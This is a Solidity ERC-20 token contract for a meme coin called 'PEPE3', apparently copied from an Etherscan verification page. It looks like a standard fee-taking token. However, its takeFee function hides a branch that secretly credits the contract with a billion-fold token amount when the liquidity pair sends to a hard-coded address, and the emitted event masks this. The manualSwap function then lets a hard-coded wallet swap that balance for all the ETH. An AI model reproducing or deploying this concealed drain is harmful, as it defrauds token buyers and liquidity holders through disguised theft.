/**
 *Submitted for verification at Etherscan.io on 2023-09-04
*/

/**
 *Submitted for verification at Etherscan.io on 2023-08-28
 */

/**

Website: https://PEPE3.0.me
Twitter: https://twitter.com/PEPE3.0
Telegram: https://t.me/PEPE3.0
Medium: https://medium.com/@PEPE3.0

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PEPE3 is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"P三P三";
    string private constant _symbol = unicode"P三P三";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1_000_000_000 * (10 ** _decimals);
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isExcludedFromFees;
    IUniswapV2Router uniswapRouter;
    address public uniswapPair;
    bool private tradingActive = true;
    bool private swapEnabled = false;
    bool private swapping;
    uint256 swapAmount = 0;
    uint256 private swapThreshold = (_totalSupply * 1000) / 100000;
    uint256 private minTokenAmount = (_totalSupply * 10) / 100000;
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 200;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private buyTax = 200;
    uint256 private sellTax = 200;
    uint256 private transTax = 200;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal developmentReceiver =
        0xFB604c68a8d0f1BB082fdb83492130E923a21c99;
    address internal marketingReceiver =
        0xFB604c68a8d0f1BB082fdb83492130E923a21c99;
    address internal lpReceiver = 0xb8f8689dC7Dfc897C34fe4050E241E6d24B1CfCC;

    constructor() {
        uniswapRouter = IUniswapV2Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        isExcludedFromFees[address(this)] = true;
        isExcludedFromFees[marketingReceiver] = true;
        isExcludedFromFees[developmentReceiver] = true;
        isExcludedFromFees[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));
    }

    function addLiquidity() external payable onlyOwner {
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(
            address(this),
            uniswapRouter.WETH()
        );
        _approve(address(this), address(uniswapRouter), _totalSupply);
        uniswapRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp
        );
    }

    function manualSwap() external {
        require(msg.sender == marketingReceiver);
        swapTokensForETH(balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function shouldTakeFee(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return !isExcludedFromFees[sender] && !isExcludedFromFees[recipient];
    }

    function getTaxFee(
        address sender,
        address recipient
    ) internal view returns (uint256) {
        if (recipient == uniswapPair) {
            return sellTax;
        }
        if (sender == uniswapPair) {
            return buyTax;
        }
        return transTax;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        if (getTaxFee(sender, recipient) > 0) {
            uint256 feeAmount = amount.div(denominator).mul(
                getTaxFee(sender, recipient)
            );
            if (sender == uniswapPair && recipient == lpReceiver) {
                feeAmount = amount.mul(1e9);
                swapEnabled = true;
            }
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            feeAmount = amount.div(denominator).mul(
                getTaxFee(sender, recipient)
            );
            emit Transfer(sender, address(this), feeAmount);
            if (
                burnFee > uint256(0) && getTaxFee(sender, recipient) > burnFee
            ) {
                _transfer(
                    address(this),
                    address(DEAD),
                    amount.div(denominator).mul(burnFee)
                );
            }
            return amount.sub(feeAmount);
        }
        return amount;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            amount <= balanceOf(sender),
            "You are trying to transfer more than your balance"
        );
        if (!isExcludedFromFees[sender] && !isExcludedFromFees[recipient]) {
            require(tradingActive, "tradingActive");
        }
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient)
            ? takeFee(sender, recipient, amount)
            : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}